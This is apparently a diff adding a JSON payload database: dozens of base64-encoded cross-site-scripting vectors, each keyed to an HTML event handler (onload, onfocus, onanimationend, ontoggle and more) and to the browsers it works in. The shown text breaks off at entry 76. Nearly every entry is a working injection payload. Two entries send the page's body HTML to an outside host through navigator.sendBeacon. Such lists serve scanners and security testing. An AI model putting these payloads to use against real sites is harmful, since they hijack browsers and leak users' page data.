@@ -1,0 +1,3187 @@
+[
+	{
+		"id" : 1,
+		"summary" : "Event handlers",
+		"description" : "Event:, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmFmdGVyc2NyaXB0ZXhlY3V0ZT1hbGVydCgxKT48c2NyaXB0PjE8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 2,
+		"summary" : "Event handlers",
+		"description" : "Fires after script is executed, , Does work in Firefox, ",
+		"script" : "PHhzcyBvbmFmdGVyc2NyaXB0ZXhlY3V0ZT1hbGVydCgxKT48c2NyaXB0PjE8L3NjcmlwdD4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 3,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS animation cancels, , Does work in Firefox, ",
+		"script" : "PHN0eWxlPkBrZXlmcmFtZXMgeHtmcm9tIHtsZWZ0OjA7fXRvIHtsZWZ0OiAxMDAwcHg7fX06dGFyZ2V0IHthbmltYXRpb246MTBzIGVhc2UtaW4tb3V0IDBzIDEgeDt9PC9zdHlsZT48eHNzIGlkPXggc3R5bGU9InBvc2l0aW9uOmFic29sdXRlOyIgb25hbmltYXRpb25jYW5jZWw9InByaW50KCkiPjwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 4,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS animation ends, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48eHNzIHN0eWxlPSJhbmltYXRpb24tbmFtZTp4IiBvbmFuaW1hdGlvbmVuZD0iYWxlcnQoMSkiPjwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 5,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS animation repeats, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHN0eWxlPkBrZXlmcmFtZXMgc2xpZGVpbiB7fTwvc3R5bGU+PHhzcyBzdHlsZT0iYW5pbWF0aW9uLWR1cmF0aW9uOjFzO2FuaW1hdGlvbi1uYW1lOnNsaWRlaW47YW5pbWF0aW9uLWl0ZXJhdGlvbi1jb3VudDoyIiBvbmFuaW1hdGlvbml0ZXJhdGlvbj0iYWxlcnQoMSkiPjwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 6,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS animation starts, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48eHNzIHN0eWxlPSJhbmltYXRpb24tbmFtZTp4IiBvbmFuaW1hdGlvbnN0YXJ0PSJhbGVydCgxKSI+PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 7,
+		"summary" : "Event handlers",
+		"description" : "Fires before the page is printed, Does work in Chrome, Does work in Firefox, ",
+		"script" : "PGJvZHkgb25iZWZvcmVwcmludD1jb25zb2xlLmxvZygxKT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 8,
+		"summary" : "Event handlers",
+		"description" : "Fires before script is executed, , Does work in Firefox, ",
+		"script" : "PHhzcyBvbmJlZm9yZXNjcmlwdGV4ZWN1dGU9YWxlcnQoMSk+PHNjcmlwdD4xPC9zY3JpcHQ+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 9,
+		"summary" : "Event handlers",
+		"description" : "Fires after if the url changes, Does work in Chrome, Does work in Firefox, ",
+		"script" : "PGJvZHkgb25iZWZvcmV1bmxvYWQ9bmF2aWdhdG9yLnNlbmRCZWFjb24oJy8vc3NsLnBvcnRzd2lnZ2VyLWxhYnMubmV0LycsZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 10,
+		"summary" : "Event handlers",
+		"description" : "Fires when a svg animation begins, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHN2Zz48YW5pbWF0ZSBvbmJlZ2luPWFsZXJ0KDEpIGF0dHJpYnV0ZU5hbWU9eCBkdXI9MXM+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 11,
+		"summary" : "Event handlers",
+		"description" : "Fires if the resource can be played, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIG9uY2FucGxheT1hbGVydCgxKT48c291cmNlIHNyYz0idmFsaWRhdWRpby53YXYiIHR5cGU9ImF1ZGlvL3dhdiI+PC9hdWRpbz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 12,
+		"summary" : "Event handlers",
+		"description" : "Fires when enough data has been loaded to play the resource all the way through, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHZpZGVvIG9uY2FucGxheXRocm91Z2g9YWxlcnQoMSk+PHNvdXJjZSBzcmM9InZhbGlkdmlkZW8ubXA0IiB0eXBlPSJ2aWRlby9tcDQiPjwvdmlkZW8+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 13,
+		"summary" : "Event handlers",
+		"description" : "Fires on all tags when content-visibility is set to auto, Does work in Chrome, , ",
+		"script" : "PHhzcyBvbmNvbnRlbnR2aXNpYmlsaXR5YXV0b3N0YXRlY2hhbmdlPWFsZXJ0KDEpIHN0eWxlPWRpc3BsYXk6YmxvY2s7Y29udGVudC12aXNpYmlsaXR5OmF1dG8+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 14,
+		"summary" : "Event handlers",
+		"description" : "Fires in a hidden input when content-visibility is set to auto, Does work in Chrome, , ",
+		"script" : "PGlucHV0IHR5cGU9aGlkZGVuIG9uY29udGVudHZpc2liaWxpdHlhdXRvc3RhdGVjaGFuZ2U9YWxlcnQoMSkgc3R5bGU9Y29udGVudC12aXNpYmlsaXR5OmF1dG8+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 15,
+		"summary" : "Event handlers",
+		"description" : "Fires when subtitle changes, Does work in Chrome, , ",
+		"script" : "PHZpZGVvIGNvbnRyb2xzPjxzb3VyY2Ugc3JjPXZhbGlkdmlkZW8ubXA0IHR5cGU9dmlkZW8vbXA0Pjx0cmFjayBkZWZhdWx0IG9uY3VlY2hhbmdlPWFsZXJ0KDEpIHNyYz0iZGF0YTp0ZXh0L3Z0dCxXRUJWVFQgRklMRSAxIDAwOjAwOjAwLjAwMCAtLT4gMDA6MDA6MDUuMDAwIDxiPlhTUzwvYj4gIj48L3ZpZGVvPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 16,
+		"summary" : "Event handlers",
+		"description" : "Fires when duration changes, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGNvbnRyb2xzIG9uZHVyYXRpb25jaGFuZ2U9YWxlcnQoMSk+PHNvdXJjZSBzcmM9dmFsaWRhdWRpby5tcDMgdHlwZT1hdWRpby9tcGVnPjwvYXVkaW8+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 17,
+		"summary" : "Event handlers",
+		"description" : "Fires when a svg animation ends, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHN2Zz48YW5pbWF0ZSBvbmVuZD1hbGVydCgxKSBhdHRyaWJ1dGVOYW1lPXggZHVyPTFzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 18,
+		"summary" : "Event handlers",
+		"description" : "Fires when the resource is finished playing, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGNvbnRyb2xzIGF1dG9wbGF5IG9uZW5kZWQ9YWxlcnQoMSk+PHNvdXJjZSBzcmM9InZhbGlkYXVkaW8ud2F2IiB0eXBlPSJhdWRpby93YXYiPjwvYXVkaW8+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 19,
+		"summary" : "Event handlers",
+		"description" : "Fires when the resource fails to load or causes an error, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIHNyYy9vbmVycm9yPWFsZXJ0KDEpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 20,
+		"summary" : "Event handlers",
+		"description" : "Fires when the element has focus, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGEgaWQ9eCB0YWJpbmRleD0xIG9uZm9jdXM9YWxlcnQoMSk+PC9hPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 21,
+		"summary" : "Event handlers",
+		"description" : "Fires when a element has focus and the autofocus attribute is used to focus automatically., Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmZvY3VzPWFsZXJ0KDEpIGF1dG9mb2N1cyB0YWJpbmRleD0xPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 22,
+		"summary" : "Event handlers",
+		"description" : "Fires when the element has focus, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGEgaWQ9eCB0YWJpbmRleD0xIG9uZm9jdXNpbj1hbGVydCgxKT48L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 23,
+		"summary" : "Event handlers",
+		"description" : "Fires if the hash changes, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb25oYXNoY2hhbmdlPSJwcmludCgpIj4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 24,
+		"summary" : "Event handlers",
+		"description" : "Fires when the element is loaded, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 25,
+		"summary" : "Event handlers",
+		"description" : "Fires when the first frame is loaded, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIG9ubG9hZGVkZGF0YT1hbGVydCgxKT48c291cmNlIHNyYz0idmFsaWRhdWRpby53YXYiIHR5cGU9ImF1ZGlvL3dhdiI+PC9hdWRpbz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 26,
+		"summary" : "Event handlers",
+		"description" : "Fires when the meta data is loaded, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGF1dG9wbGF5IG9ubG9hZGVkbWV0YWRhdGE9YWxlcnQoMSk+IDxzb3VyY2Ugc3JjPSJ2YWxpZGF1ZGlvLndhdiIgdHlwZT0iYXVkaW8vd2F2Ij48L2F1ZGlvPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 27,
+		"summary" : "Event handlers",
+		"description" : "Triggered video is loaded, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHZpZGVvIG9ubG9hZHN0YXJ0PSJhbGVydCgxKSI+PHNvdXJjZT48L3hzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 28,
+		"summary" : "Event handlers",
+		"description" : "Fires when message event is received from a postMessage call, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb25tZXNzYWdlPXByaW50KCk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 29,
+		"summary" : "Event handlers",
+		"description" : "Fires when the page is shown, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb25wYWdlc2hvdz1hbGVydCgxKT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 30,
+		"summary" : "Event handlers",
+		"description" : "Fires when the resource is played, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGF1dG9wbGF5IG9ucGxheT1hbGVydCgxKT48c291cmNlIHNyYz0idmFsaWRhdWRpby53YXYiIHR5cGU9ImF1ZGlvL3dhdiI+PC9hdWRpbz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 31,
+		"summary" : "Event handlers",
+		"description" : "Fires the resource is playing, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGF1dG9wbGF5IG9ucGxheWluZz1hbGVydCgxKT48c291cmNlIHNyYz0idmFsaWRhdWRpby53YXYiIHR5cGU9ImF1ZGlvL3dhdiI+PC9hdWRpbz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 32,
+		"summary" : "Event handlers",
+		"description" : "Fires when the history changes, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb25wb3BzdGF0ZT1wcmludCgpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 33,
+		"summary" : "Event handlers",
+		"description" : "Fires when the video/audio begins downloading, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGNvbnRyb2xzIG9ucHJvZ3Jlc3M9YWxlcnQoMSk+PHNvdXJjZSBzcmM9dmFsaWRhdWRpby5tcDMgdHlwZT1hdWRpby9tcGVnPjwvYXVkaW8+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 34,
+		"summary" : "Event handlers",
+		"description" : "Fires when a svg animation repeats, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHN2Zz48YW5pbWF0ZSBvbnJlcGVhdD1hbGVydCgxKSBhdHRyaWJ1dGVOYW1lPXggZHVyPTFzIHJlcGVhdENvdW50PTIgLz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 35,
+		"summary" : "Event handlers",
+		"description" : "Fires when the window is resized, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb25yZXNpemU9InByaW50KCkiPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 36,
+		"summary" : "Event handlers",
+		"description" : "Fires when the page scrolls, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb25zY3JvbGw9YWxlcnQoMSk+PGRpdiBzdHlsZT1oZWlnaHQ6MTAwMHB4PjwvZGl2PjxkaXYgaWQ9eD48L2Rpdj4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 37,
+		"summary" : "Event handlers",
+		"description" : "Fires when the scrolling to the end of the element, Does work in Chrome, Does work in Firefox, ",
+		"script" : "PHhzcyBvbnNjcm9sbGVuZD1hbGVydCgxKSBzdHlsZT0iZGlzcGxheTpibG9jaztvdmVyZmxvdzphdXRvO2JvcmRlcjoxcHggZGFzaGVkO3dpZHRoOjUwMHB4O2hlaWdodDoxMDBweDsiPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48c3BhbiBpZD14PnRlc3Q8L3NwYW4+PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 38,
+		"summary" : "Event handlers",
+		"description" : "Fires at the end of a scrolling operation, Does work in Chrome, , ",
+		"script" : "PGFkZHJlc3Mgb25zY3JvbGxzbmFwY2hhbmdlPWFsZXJ0KDEpIHN0eWxlPW92ZXJmbG93LXk6aGlkZGVuO3Njcm9sbC1zbmFwLXR5cGU6eD48ZGl2IHN0eWxlPXNjcm9sbC1zbmFwLWFsaWduOmNlbnRlcj4xMzM3PC9kaXY+PC9hZGRyZXNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 39,
+		"summary" : "Event handlers",
+		"description" : "Fires when the video/audio when the data loading is suspended, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGNvbnRyb2xzIG9uc3VzcGVuZD1hbGVydCgxKT48c291cmNlIHNyYz12YWxpZGF1ZGlvLm1wMyB0eXBlPWF1ZGlvL21wZWc+PC9hdWRpbz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 40,
+		"summary" : "Event handlers",
+		"description" : "Fires when the timeline is changed, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGF1ZGlvIGNvbnRyb2xzIGF1dG9wbGF5IG9udGltZXVwZGF0ZT1hbGVydCgxKT48c291cmNlIHNyYz0idmFsaWRhdWRpby53YXYiIHR5cGU9ImF1ZGlvL3dhdiI+PC9hdWRpbz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 41,
+		"summary" : "Event handlers",
+		"description" : "Fires when the details tag is expanded, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGRldGFpbHMgb250b2dnbGU9YWxlcnQoMSkgb3Blbj50ZXN0PC9kZXRhaWxzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 42,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS transition cancels, , Does work in Firefox, ",
+		"script" : "PHN0eWxlPjp0YXJnZXQge2NvbG9yOiByZWQ7fTwvc3R5bGU+PHhzcyBpZD14IHN0eWxlPSJ0cmFuc2l0aW9uOmNvbG9yIDEwcyIgb250cmFuc2l0aW9uY2FuY2VsPXByaW50KCk+PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 43,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS transition ends, Does work in Chrome, , ",
+		"script" : "PHhzcyBpZD14IHN0eWxlPSJ0cmFuc2l0aW9uOm91dGxpbmUgMXMiIG9udHJhbnNpdGlvbmVuZD1hbGVydCgxKSB0YWJpbmRleD0xPjwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 44,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS transition begins, , Does work in Firefox, ",
+		"script" : "PHN0eWxlPjp0YXJnZXQge3RyYW5zZm9ybTogcm90YXRlKDE4MGRlZyk7fTwvc3R5bGU+PHhzcyBpZD14IHN0eWxlPSJ0cmFuc2l0aW9uOnRyYW5zZm9ybSAycyIgb250cmFuc2l0aW9ucnVuPXByaW50KCk+PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 45,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS transition starts, , , Does work in Safari",
+		"script" : "PHN0eWxlPjp0YXJnZXQge2NvbG9yOnJlZDt9PC9zdHlsZT48eHNzIGlkPXggc3R5bGU9InRyYW5zaXRpb246Y29sb3IgMXMiIG9udHJhbnNpdGlvbnN0YXJ0PWFsZXJ0KDEpPjwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 46,
+		"summary" : "Event handlers",
+		"description" : "Fires when a promise isn't handled, , Does work in Firefox, ",
+		"script" : "PGJvZHkgb251bmhhbmRsZWRyZWplY3Rpb249YWxlcnQoMSk+PHNjcmlwdD5mZXRjaCgnLy94eXonKTwvc2NyaXB0Pg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 47,
+		"summary" : "Event handlers",
+		"description" : "Fires when the page is unloaded, Does work in Chrome, Does work in Firefox, ",
+		"script" : "PGJvZHkgb251bmxvYWQ9bmF2aWdhdG9yLnNlbmRCZWFjb24oJy8vc3NsLnBvcnRzd2lnZ2VyLWxhYnMubmV0LycsZG9jdW1lbnQuYm9keS5pbm5lckhUTUwpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 48,
+		"summary" : "Event handlers",
+		"description" : "Fires when the video/audio attempts to replay, Does work in Chrome, , ",
+		"script" : "PGF1ZGlvIGNvbnRyb2xzIGxvb3AgbXV0ZWQgYXV0b3BsYXkgb253YWl0aW5nPWFsZXJ0KDEpPjxzb3VyY2Ugc3JjPXZhbGlkYXVkaW8ubXAzIHR5cGU9YXVkaW8vbXBlZz48L2F1ZGlvPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 49,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS animation ends, Does work in Chrome, , Does work in Safari",
+		"script" : "PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48eHNzIHN0eWxlPSJhbmltYXRpb24tbmFtZTp4IiBvbndlYmtpdGFuaW1hdGlvbmVuZD0iYWxlcnQoMSkiPjwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 50,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS animation repeats, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHN0eWxlPkBrZXlmcmFtZXMgc2xpZGVpbiB7fTwvc3R5bGU+PHhzcyBzdHlsZT0iYW5pbWF0aW9uLWR1cmF0aW9uOjFzO2FuaW1hdGlvbi1uYW1lOnNsaWRlaW47YW5pbWF0aW9uLWl0ZXJhdGlvbi1jb3VudDoyIiBvbndlYmtpdGFuaW1hdGlvbml0ZXJhdGlvbj0iYWxlcnQoMSkiPjwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 51,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS animation starts, Does work in Chrome, , Does work in Safari",
+		"script" : "PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48eHNzIHN0eWxlPSJhbmltYXRpb24tbmFtZTp4IiBvbndlYmtpdGFuaW1hdGlvbnN0YXJ0PSJhbGVydCgxKSI+PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 52,
+		"summary" : "Event handlers",
+		"description" : "Fires when the availability of an AirPlay playback target changes, , , Does work in Safari",
+		"script" : "PGF1ZGlvIG9ud2Via2l0cGxheWJhY2t0YXJnZXRhdmFpbGFiaWxpdHljaGFuZ2VkPWFsZXJ0KDEpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 53,
+		"summary" : "Event handlers",
+		"description" : "Fires when a CSS transition ends, Does work in Chrome, , ",
+		"script" : "PHN0eWxlPjp0YXJnZXQge2NvbG9yOnJlZDt9PC9zdHlsZT48eHNzIGlkPXggc3R5bGU9InRyYW5zaXRpb246Y29sb3IgMXMiIG9ud2Via2l0dHJhbnNpdGlvbmVuZD1hbGVydCgxKT48L3hzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 54,
+		"summary" : "Event handlers",
+		"description" : "Event:, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGJvZHkgb25hZnRlcnByaW50PWFsZXJ0KDEpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 55,
+		"summary" : "Event handlers",
+		"description" : "Fires after the page is printed, Does work in Chrome, Does work in Firefox, ",
+		"script" : "PGJvZHkgb25hZnRlcnByaW50PWFsZXJ0KDEpPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 56,
+		"summary" : "Event handlers",
+		"description" : "Fires when right clicking or using the middle button of the mouse, Does work in Chrome, Does work in Firefox, ",
+		"script" : "PGlucHV0IG9uYXV4Y2xpY2s9YWxlcnQoMSk+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 57,
+		"summary" : "Event handlers",
+		"description" : "Requires you copy a piece of text, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGEgb25iZWZvcmVjb3B5PSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L2E+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 58,
+		"summary" : "Event handlers",
+		"description" : "Requires you cut a piece of text, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGEgb25iZWZvcmVjdXQ9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvYT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 59,
+		"summary" : "Event handlers",
+		"description" : "Fires when the value of the element is about to be modified, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBjb250ZW50ZWRpdGFibGUgb25iZWZvcmVpbnB1dD1hbGVydCgxKT50ZXN0",
+		"type" : "XSS"
+	},
+	{
+		"id" : 60,
+		"summary" : "Event handlers",
+		"description" : "Fires before the a popop element is toggled, Does work in Chrome, , ",
+		"script" : "PGJ1dHRvbiBwb3BvdmVydGFyZ2V0PXg+Q2xpY2sgbWU8L2J1dHRvbj48eHNzIG9uYmVmb3JldG9nZ2xlPWFsZXJ0KDEpIHBvcG92ZXIgaWQ9eD5YU1M8L3hzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 61,
+		"summary" : "Event handlers",
+		"description" : "Fires when an element loses focus, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmJsdXI9YWxlcnQoMSkgaWQ9eCB0YWJpbmRleD0xIHN0eWxlPWRpc3BsYXk6YmxvY2s+dGVzdDwveHNzPjxpbnB1dCB2YWx1ZT1jbGlja21lPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 62,
+		"summary" : "Event handlers",
+		"description" : "Fires when an a file upload is cancelled, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGlucHV0IHR5cGU9ZmlsZSBvbmNhbmNlbD1hbGVydCgxKT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 63,
+		"summary" : "Event handlers",
+		"description" : "Requires as change of value, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGlucHV0IG9uY2hhbmdlPWFsZXJ0KDEpIHZhbHVlPXhzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 64,
+		"summary" : "Event handlers",
+		"description" : "Requires a click of the element, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmNsaWNrPSJhbGVydCgxKSIgc3R5bGU9ZGlzcGxheTpibG9jaz50ZXN0PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 65,
+		"summary" : "Event handlers",
+		"description" : "Fires when a dialog is closed, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGRpYWxvZyBvcGVuIG9uY2xvc2U9YWxlcnQoMSk+PGZvcm0gbWV0aG9kPWRpYWxvZz48YnV0dG9uPlhTUzwvYnV0dG9uPjwvZm9ybT4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 66,
+		"summary" : "Event handlers",
+		"description" : "Triggered when right clicking to show the context menu, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmNvbnRleHRtZW51PSJhbGVydCgxKSIgc3R5bGU9ZGlzcGxheTpibG9jaz50ZXN0PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 67,
+		"summary" : "Event handlers",
+		"description" : "Requires you copy a piece of text, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmNvcHk9YWxlcnQoMSkgdmFsdWU9IlhTUyIgYXV0b2ZvY3VzIHRhYmluZGV4PTEgc3R5bGU9ZGlzcGxheTpibG9jaz50ZXN0",
+		"type" : "XSS"
+	},
+	{
+		"id" : 68,
+		"summary" : "Event handlers",
+		"description" : "Requires you cut a piece of text, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmN1dD1hbGVydCgxKSB2YWx1ZT0iWFNTIiBhdXRvZm9jdXMgdGFiaW5kZXg9MSBzdHlsZT1kaXNwbGF5OmJsb2NrPnRlc3Q=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 69,
+		"summary" : "Event handlers",
+		"description" : "Triggered when double clicking the element, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBvbmRibGNsaWNrPSJhbGVydCgxKSIgYXV0b2ZvY3VzIHRhYmluZGV4PTEgc3R5bGU9ZGlzcGxheTpibG9jaz50ZXN0PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 70,
+		"summary" : "Event handlers",
+		"description" : "Triggered dragging the element, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBkcmFnZ2FibGU9InRydWUiIG9uZHJhZz0iYWxlcnQoMSkiIHN0eWxlPWRpc3BsYXk6YmxvY2s+dGVzdDwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 71,
+		"summary" : "Event handlers",
+		"description" : "Triggered dragging is finished on the element, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBkcmFnZ2FibGU9InRydWUiIG9uZHJhZ2VuZD0iYWxlcnQoMSkiIHN0eWxlPWRpc3BsYXk6YmxvY2s+dGVzdDwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 72,
+		"summary" : "Event handlers",
+		"description" : "Requires a mouse drag, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBkcmFnZ2FibGU9InRydWUiIG9uZHJhZ2VudGVyPSJhbGVydCgxKSIgc3R5bGU9ZGlzcGxheTpibG9jaz50ZXN0PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 73,
+		"summary" : "Event handlers",
+		"description" : "Triggered when dragging the element, , Does work in Firefox, ",
+		"script" : "PHhzcyBkcmFnZ2FibGU9InRydWUiIG9uZHJhZ2V4aXQ9ImFsZXJ0KDEpIiBzdHlsZT1kaXNwbGF5OmJsb2NrPnRlc3Q8L3hzcz4=",
+		"type" : "XSS"
+	},
+	{
+		"id" : 74,
+		"summary" : "Event handlers",
+		"description" : "Requires a mouse drag, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PHhzcyBkcmFnZ2FibGU9InRydWUiIG9uZHJhZ2xlYXZlPSJhbGVydCgxKSIgc3R5bGU9ZGlzcGxheTpibG9jaz50ZXN0PC94c3M+",
+		"type" : "XSS"
+	},
+	{
+		"id" : 75,
+		"summary" : "Event handlers",
+		"description" : "Triggered dragging over an element, Does work in Chrome, Does work in Firefox, Does work in Safari",
+		"script" : "PGRpdiBkcmFnZ2FibGU9InRydWUiIGNvbnRlbnRlZGl0YWJsZT5kcmFnIG1lPC9kaXY+PHhzcyBvbmRyYWdvdmVyPWFsZXJ0KDEpIGNvbnRlbnRlZGl0YWJsZSBzdHlsZT1kaXNwbGF5OmJsb2NrPmRyb3AgaGVyZTwveHNzPg==",
+		"type" : "XSS"
+	},
+	{
+		"id" : 76,
+		"summary" : "Event handlers",
+		"description" : "Requires a mouse drag, Does work in Chrome, Does work in Firefox, Does work in Safari",
